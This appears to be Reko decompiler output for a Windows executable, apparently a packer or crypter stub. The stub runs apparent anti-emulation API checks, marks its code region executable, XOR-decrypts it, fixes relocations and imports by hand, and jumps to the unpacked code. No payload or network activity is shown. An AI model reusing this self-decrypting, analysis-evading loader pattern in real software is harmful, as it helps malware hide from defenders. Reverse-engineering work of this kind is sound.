// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_3 esi_12 = null;
	Eq_3 edi_17 = (struct <anonymous> *) 0x1F;
	Eq_2 eax_24 = AddUsersToEncryptedFile(&globals->t403020, null);
	if (eax_24 != 0x00)
	{
		Eq_17 eax_33 = AreAllAccessesGranted(~0x00, ~0x00);
		if (eax_33 == 0x00)
			edi_17 = eax_33 + 0x11;
		VirtualProtect(&globals->v401000, 0x3000, 0x40, fp - 0x20);
		struct Eq_40 * esp_46 = fp - 0x44;
		struct Eq_43 * ecx_52 = null;
		do
		{
			if (esi_12 == edi_17)
				esi_12 = null;
			ecx_52[4199880] = (struct Eq_43) (esi_12[0x00404000] ^ ecx_52[4199880] ^ 0x90);
			ecx_52 = ecx_52 + 0x01;
			esi_12 = (Eq_3) (esi_12 + 0x01);
		} while (ecx_52 < (struct Eq_43 *) 0x1440);
		word32 ebp_86 = 0x00401348;
		struct Eq_69 * edx_247 = &globals->t4028C8;
		uint32 edi_250 = 0x00;
		uint32 dwLoc28_246 = 0x00;
		if (true)
		{
			do
			{
				Eq_85 eax_255 = edx_247->t0004 - 0x08 >> 0x01;
				cui16 * ecx_259 = (char *) &edx_247->t0004 + 0x04;
				if (eax_255 > 0x00)
				{
					Eq_85 ebx_275 = eax_255;
					do
					{
						if ((*ecx_259 & 0xF000) == 0x3000)
						{
							struct Eq_115 * eax_297 = ((word32) *ecx_259 & 0x0FFF) + edx_247->dw0000;
							eax_297->dw401348 = eax_297->dw401348 + 0xF0401348;
						}
						ecx_259 = ecx_259 + 0x01;
						ebx_275 = ebx_275 - 0x01;
					} while (ebx_275 != 0x00);
					edi_250 = dwLoc28_246;
				}
				edi_250 = (word32) edx_247->t0004 + edi_250;
				dwLoc28_246 = edi_250;
				edx_247 = edx_247 + Mem76[edx_247 + 0x04:word32];
			} while (edi_250 < ~0x00);
		}
		struct Eq_76 * edi_105 = &globals->t4020B4;
		edi_135 = edi_105;
		ebp_137 = ebp_86;
		esp_140 = esp_46;
		if (globals->dw4020C4 != 0x00)
		{
			do
			{
				struct Eq_76 * edi_135;
				word32 ebp_137;
				struct Eq_40 * esp_140;
				esp_140 = esp_140 - 0x04 + 0x18;
				esp_140->dw0000 = edi_135->dw000C + ebp_137;
				Eq_176 eax_145 = LoadLibraryA(esp_140->dw0000);
				esp_140[0x04] = (struct Eq_40) eax_145;
				if (eax_145 != null)
				{
					word32 ecx_169 = edi_135->dw0000;
					if (ecx_169 == 0x00)
						ecx_169 = edi_135->dw0010;
					word32 * ebp_176 = ebp_137 + ecx_169;
					word32 * edi_179 = (word32) esp_140[0x03].dw0000 + edi_135->dw0010;
					if (*ebp_176 != 0x00)
					{
						while (true)
						{
							Eq_236 eax_216;
							int32 ecx_207 = *ebp_176;
							word16 cx_208 = (word16) ecx_207;
							if (ecx_207 < 0x00)
							{
								LPCSTR * esp_227 = esp_140 - 0x04;
								*esp_227 = (LPCSTR *) (word32) cx_208;
								*(esp_227 - 0x04) = (HMODULE *) eax_145;
								eax_216 = GetProcAddress(*(esp_227 - 0x04), *esp_227);
							}
							else
							{
								LPCSTR * esp_238 = esp_140 - 0x04;
								*esp_238 = (LPCSTR *) (ecx_207 + 0x02 + esp_140->dw0000);
								*(esp_238 - 0x04) = (HMODULE *) eax_145;
								eax_216 = GetProcAddress(*(esp_238 - 0x04), *esp_238);
							}
							*edi_179 = (word32) eax_216;
							esp_140 = esp_140 - 0x08;
							ebp_176 = ebp_176 + 0x01;
							edi_179 = edi_179 + 0x01;
							if (*ebp_176 == 0x00)
								break;
							eax_145 = (Eq_176) esp_140[0x04];
						}
					}
					ebp_137 = (word32) esp_140[0x03];
					edi_135 = esp_140->dw001C;
				}
				edi_135 = edi_135 + 0x01;
				esp_140->dw001C = edi_135;
			} while (edi_135->dw0010 != 0x00);
		}
		ptr32 esp_112;
		byte SCZO_113;
		word32 ebx_114;
		word32 ebp_115;
		word32 esi_116;
		byte SZO_117;
		byte C_118;
		word32 edi_119;
		word32 eax_120;
		byte Z_121;
		word32 ecx_122;
		byte dl_123;
		word32 edx_124;
		byte CZ_125;
		word16 ax_126;
		byte S_127;
		word16 cx_128;
		globals->t401DA8();
		*(esp_112 - 0x04) = 0x00;
		ExitProcess(*(esp_112 - 0x04));
	}
	else
		return eax_24;
}

